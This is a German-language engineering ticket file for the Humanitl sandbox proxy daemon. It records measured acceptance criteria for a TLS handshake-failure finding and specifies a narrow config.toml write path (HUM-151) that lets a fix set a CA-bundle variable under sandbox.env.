- [x] Ein Tunnel mit mindestens einer Anfrage ergibt keinen Befund. **Gemessen am 2026-09-11**: `a_tunnel_that_carried_a_request_gets_no_finding` (die Anfrage wird von einer Regel sofort beantwortet, der Tunnel endet, die Prüfung läuft) und `a_tunnel_that_carried_garbage_gets_no_finding` (Vorspann von HTTP/2, von hyper vor jedem Aufruf verworfen); die Mutation ohne Anfragezähler macht den ersten rot, die ohne Prüfung auf ein ruhiges Ende den zweiten. Grundlage im Review: Codex, der Zähler zählte Aufrufe des Dienstes und nicht Anfragen.
- [x] `curl --cacert <fremde Wurzel> https://example.com` in der Sandbox erzeugt die Karte mit `CURL_CA_BUNDLE` in der Oberfläche und den Flow in `humanitl --json flows list`. **Gemessen am 2026-09-11** auf Xvfb gegen einen echten Daemon mit curl 8.22 und `--cacert /usr/share/ca-certificates/mozilla/ISRG_Root_X1.crt`: curl endet mit Exit 60, `flows list` zeigt `CONNECT example.com block tls_handshake_failed`, und über der Warteschlange steht `TLS_001` mit „A client that calls itself curl … finished the TLS handshake for example.com and then closed the connection without sending a request", dem Abzeichen „CURL_CA_BUNDLE setzen" und dem Export-Befehl. Nach der Umstellung auf das ruhige Ende ein zweites Mal gemessen, dasselbe Ergebnis.
- [x] Das erste Kriterium von HUM-045 ist danach mit dem echten curl gemessen. **Gemessen am 2026-09-11**, mit der Umformulierung dort, die dieser Abschnitt ankündigt.

### Fallstricke
- Ein Client, der Verbindungen nur vorsorglich öffnet (Vorabverbindung eines Browsers), sähe genauso aus. Für die Werkzeuge in der Sandbox ist das selten; das Zählfenster je Host begrenzt die Karten, und der Satz sagt „meist", nicht „immer".
- `--cacert /dev/null` bleibt ein anderer Fall: Dort sieht curl nie ein Zertifikat. Das Kriterium von HUM-045 wird deshalb mit einer fremden Wurzel gemessen, und die Umformulierung steht dort.

### Referenzen
Messungen vom 2026-09-11 (`curl -v` in der Sandbox, `openssl s_client`, Trace-Protokoll des Proxys); `daemon/crates/proxy/src/handler.rs` (`handle_connect`, `note_handshake_failure`, `serve_connection`); `daemon/crates/proxy/src/tls_observe.rs` (`TlsFailure`, `classify`).

---

## HUM-151 · Der Fix für eine CA-Variable schreibt in `config.toml`
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-045, HUM-106 · Blockiert: das zweite Akzeptanzkriterium von HUM-045

### Kontext
`TLS_001` schlägt vor, eine CA-Variable wie `CURL_CA_BUNDLE` auf das Zertifikat zu richten, das Humanitl in der Sandbox einhängt (`FixAction::SetEnv`). Die Karte kann heute nur den Export-Befehl für die laufende Sitzung kopieren. Das zweite Kriterium von HUM-045 verlangt, dass der Fix für künftige Sitzungen in die Konfiguration schreibt und `humanitl config get sandbox.env` ihn danach zeigt. Einen Schreibweg gibt es nicht: `SetConfig` antwortet `unimplemented` und wartet auf den Einstellungen-Bildschirm (HUM-069), und im Repository schreibt nichts `config.toml`.

### Ziel
Ein schmaler Schreibweg, gerade breit genug für diesen Fix. `SetConfig` nimmt genau eine Art Auftrag an: eine Variable unter `sandbox.env`, deren Wert das Zertifikat in der Sandbox ist (`/etc/humanitl/ca.crt`). Die Karte bekommt dafür einen Knopf, der sagt, wohin er schreibt.

### Nicht-Ziel
Der allgemeine `SetConfig` und `GetConfig` (HUM-069), `humanitl config set`, ein Schreiben in ein Profil. Eine Wirkung auf die laufende Sitzung: Deren Umgebung steht mit ihrem Start fest.

### Spezifikation
- `humanitl-config` bekommt ein Modul `edit` mit `set_sandbox_env(path, name, value)`. Es liest `config.toml` (eine fehlende Datei gilt als leer) und ändert das Dokument mit `toml_edit`, der Bibliothek aus derselben Familie wie `toml`, damit Kommentare, Reihenfolge und Schreibweise des Menschen bleiben. Das Ergebnis wird mit `toml` geparst und muss genau der alten Tabelle mit dem einen neuen Wert entsprechen; sonst schreibt es nichts und meldet `CONFIG_015`, ebenso wenn `sandbox` oder `sandbox.env` dort etwas anderes als eine Tabelle ist. Eine Datei, die schon vorher kein TOML ist, bleibt unberührt (`CONFIG_001`). Geschrieben wird atomar über eine Nebendatei und `rename`, mit den Rechten der alten Datei oder `0600`. Ein Symlink wird bis zu seinem Ziel verfolgt, damit eine verlinkte `config.toml` verlinkt bleibt. Steht der Wert schon so da, wird nichts geschrieben.
- `SetConfig` im Daemon nimmt `key = sandbox.env.<NAME>` mit `NAME` aus Großbuchstaben, Ziffern und `_`, der kein Loader-Schlüssel ist, und `value` genau gleich dem Zertifikatspfad der Sandbox. Alles andere ist `CONFIG_014` mit `INVALID_ARGUMENT` und dem Hinweis, dass der Rest mit HUM-069 kommt. Die Antwort ist ein `ConfigSnapshot` aus einer neuen Auflösung ohne Profilwunsch: `toml`, `origins`, `diagnostics`.
- Die App: `DaemonClient.setConfig(key, value)` in gRPC-Client und Fake. `FixControl` zeigt für ein `SetEnv`, dessen Wert der Zertifikatspfad ist, den Knopf „In config.toml schreiben", danach entweder, was geschrieben wurde, oder den Grund, warum nicht. Der Export-Befehl für die laufende Sitzung bleibt. Für jedes andere `SetEnv` gibt es keinen Knopf; `XDG_RUNTIME_DIR` etwa meint die Umgebung des Daemons und nicht die der Sandbox.
- Der `why` von `TLS_001` sagt zusätzlich, dass ein Profil mit eigenem `sandbox.env` die Tabelle aus `config.toml` ersetzt. Das ist die Pflicht aus dem Stand-Abschnitt von HUM-045.

### Tests
- Unit-Tests des Schreibers: neue Datei, Kommentare bleiben, Zeile ersetzt, Zeile ergänzt, Block angehängt, Inline-Tabelle, kaputte Datei bleibt unberührt, gleicher Wert schreibt nichts, Rechte, Symlink.
- Integrationstest des RPC: abgelehnter Schlüssel, abgelehnter Wert, gelungenes Schreiben mit der Variable in der neuen Auflösung.
- Widget-Tests des Knopfes: Aufruf mit `sandbox.env.<NAME>`, Erfolg, Fehler, kein Knopf für einen anderen Wert.
- Messung gegen einen echten Daemon: Nach dem Schreiben steht die Variable in `humanitl config get sandbox.env`.

### Akzeptanzkriterien
- [x] `SetConfig` schreibt `sandbox.env.<NAME>` mit dem Zertifikatspfad nach `config.toml`, Kommentare bleiben, und jeder andere Schlüssel oder Wert ist `CONFIG_014`. **Gemessen am 2026-09-11.** Über den echten Socket: `set_config_writes_the_ca_variable_and_a_new_resolution_sees_it`, `set_config_refuses_everything_but_the_ca_path_and_writes_nothing` (anderer Wert, anderer Schlüssel, `LD_PRELOAD`, kleingeschriebener Name, jedes Mal `INVALID_ARGUMENT` mit `CONFIG_014`, und keine Datei entsteht) und `set_config_on_a_file_it_cannot_edit_is_config_015_and_the_file_stays` in `daemon/crates/ipc/tests/ipc_server.rs`. Der Schreiber in `daemon/crates/config/tests/edit.rs` mit 16 Tests: Kommentare, Reihenfolge und Leerzeilen bleiben, ein ersetzter Wert behält seinen Kommentar, Inline-Tabelle und gepunkteter Schlüssel bleiben in ihrer Form, eine Datei nur aus Kommentaren behält sie oben, CRLF und eine Markierung der Byte-Reihenfolge bleiben, eine Datei ohne TOML oder mit `sandbox` als Nicht-Tabelle bleibt unberührt, derselbe Wert schreibt nichts (gleicher Inode), Rechte bleiben, ein Symlink bleibt ein Symlink, acht Schreiber zugleich verlieren nichts. Zehn Mutationen, jede macht genau den gemeinten Test rot: ohne die Abkürzung bei gleichem Wert, ohne den Kommentar am ersetzten Wert, ohne das Folgen des Symlinks, ohne die alten Rechte, ohne die Sperre, ohne CRLF, ohne die Markierung, ohne das Verschieben der Schlusskommentare, und in `config_rpc.rs` ohne die Prüfung des Werts und ohne die der Loader-Variablen. Der Fake nimmt dieselbe Tür (`config_rpc::accepted`, Test `config_answers_and_keeps_only_what_the_daemon_accepts`). Grundlage im Review: Codex vor seinem Limit (der Fake nahm jeden Schlüssel an) und der Ersatz-Review (CRLF, Markierung).
- [x] Der Knopf der Karte schreibt, und `humanitl config get sandbox.env` zeigt danach die Variable. **Gemessen am 2026-09-11**, in zwei Hälften, die sich an einer Stelle treffen. Der Widget-Test `the_default_writes_sandbox_env_through_the_client` zeigt, dass der Knopf über den Standard-Schreiber `SetConfig` mit `sandbox.env.CURL_CA_BUNDLE` und dem Zertifikatspfad ruft. `daemon_live_test.dart`, `the_ca_write_of_the_button_is_what_config_get_reads`, ruft denselben Schreiber gegen einen echten `humanitld`, und `humanitl --json config get sandbox.env` antwortet danach mit der Variable und der Herkunft `config.toml`. Ein Klick auf Pixel gegen den echten Daemon ist nicht gemessen: Auf diesem Rechner gibt es kein `xdotool`.
- [x] Der `why` von `TLS_001` nennt das Profil, das den Fix überstimmt, und keine Beschriftung verspricht ein Profil. **Gemessen am 2026-09-11.** Der Satz „a profile that sets sandbox.env of its own replaces that table from config.toml" steht im `why` jeder CA-Variable; `tls_observe.rs` sichert ihn im Test über alle Werkzeughinweise zu. Die Beschriftung lautet „Write to config.toml" beziehungsweise „In config.toml schreiben", und `fix_control_test.dart` findet genau diesen Text. Ein Profil nennt nur die Zeile nach dem Erfolg, und zwar als den Fall, in dem der Wert nicht ankommt.

### Fallstricke
- Eine Profilebene mit `sandbox.env` ersetzt die ganze Tabelle, denn `sandbox.env` ist eine freie Tabelle und damit ein einziges Blatt. Der Knopf verspricht deshalb nur, was er tut: in `config.toml` schreiben.
- Zwei Aufträge zugleich: Ein Mutex im Daemon ordnet sie, und `rename` lässt nie eine halbe Datei zurück.
- Der Daemon schreibt damit zum ersten Mal in die Konfiguration des Menschen. Die Tür ist deshalb so schmal wie der Fix: ein Pfad als Wert, der nur auf das eigene Zertifikat zeigen kann.

### Referenzen
HUM-045 (Stand-Abschnitt), HUM-069, `docs/profiles.md` (Ebenen), `daemon/crates/proxy/src/tls_observe.rs` (`rejected_ca`), `daemon/crates/proxy/src/ca.rs` (`write_atomic`), `toml_edit` (https://docs.rs/toml_edit).
